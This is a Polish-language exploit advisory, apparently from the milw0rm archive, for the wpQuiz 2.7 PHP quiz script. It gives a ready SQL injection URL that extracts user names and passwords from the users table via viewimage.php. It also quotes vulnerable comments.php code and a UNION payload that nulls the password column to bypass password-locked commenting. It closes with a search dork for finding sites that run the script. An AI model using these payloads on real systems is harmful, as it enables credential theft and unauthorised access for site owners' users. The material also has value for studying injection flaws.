@@ -1,0 +1,91 @@
+Tytul: wpQuiz 2.7 Remote SQL Injection Vulnerability
+### http://wireplastik.com/projects.php
+
+
+Autor: Kacper
+E-Mail: kacper1964@yahoo.pl
+Strona: devilteam.eu
+
+Irc: irc.myg0t.com #devilteam
+
+Blad:
+
+
+viewimage.php?id=-1'+union+select+0,1,2,3,4,5,6,7,8,9,10,11,12,concat(user,char(58),password),14,15+from+users+where+id=1/*
+
+Pozniej sciagnij obrazek i sprawdz jego zrodlo!
+
+
+==========================================================================================================================
+Kolejny blad dotyczy nieautoryzowanego dostepu do komentowania wynikow na quizie.
+
+
+
+
+
+
+
+
+Skopiowane prosto z => http://devilteam.eu/forum/topics92/bypass-za-pomoca-sql-wpquiz-vt4278.htm
+==========================================================================================================================
+Elo, ostatnio natknolem sie na ciekawy skrypt Quizowy (WpQuiz) i znalazlem w nim pare ciekawych bledow. 
+
+w skrypcie istnieje opcja pozwalajaca na blokowanie na haslo przez administratora komentowania wynikow w quizie. 
+
+Plik comments.php zawiera zrodlo: 
+Kod:
+$no = $_GET['id']; 
+$setcheck = mysql_fetch_array(mysql_query("SELECT * FROM sets WHERE id='".$no."'")); 
+if( mysql_affected_rows() == 0 ){ 
+geterror("commentsinvalidset"); 
+} 
+if( $setcheck['isopen'] == 0 ){ 
+geterror("commentsquestionsetclosed"); 
+} 
+if($setcheck['password'] != ""){ 
+if( !isset($_POST['password']) || ($_POST['password'] != $setcheck['password']) ){ 
+?> 
+<form name="pwCheck" action="<?= $_SERVER['PHP_SELF'] ?>?id=<?=$no?>" method="post"> 
+<div class="pagehead"><span class="big"><b><?=getlang("commentspasswordheader",1)?></b></span></div> 
+<b><?=getlang("commentspasswordrequest",1)?></b><br /> 
+<?=getlang("commentspassword",1)?> <input type="password" name="password" /> 
+<input type="submit" value="<?=getlang("commentspasswordsubmit",1)?>" /> 
+</form> 
+<?php 
+exit; 
+} 
+}
+
+
+
+jak widac: 
+Kod:
+if($setcheck['password'] != ""){
+
+
+
+skrypt pobiera informacje z bazy danych na temat blokowania komentowania. Jesli ta opcja bedzie pusta czyli (null=0) to skrypt nie zawola o haslo. 
+
+wiec wykonujemy zapytanie SQL dzieki linijce: 
+Kod:
+$no = $_GET['id']; 
+$setcheck = mysql_fetch_array(mysql_query("SELECT * FROM sets WHERE id='".$no."'"));
+
+
+
+Nasze zapytanie: 
+Kod:
+comments.php?id=-9'+union+select+0,1,2,3,4,5,null,7,8,9,10,11,12,13/*
+
+
+
+metoda prob i bledow doszedlem do tego ¿e kolumna numer 6 odpowiada za haslo i dalem tam null'a  
+
+taki maly tutek mo¿e sie przydac dla tych co chca cos omijac zablokowanego na haslo  
+==========================================================================================================================
+
+//dork:"Powered by wpQuiz" 
+
+Pozdrawiam
+
+# milw0rm.com [2007-11-27]
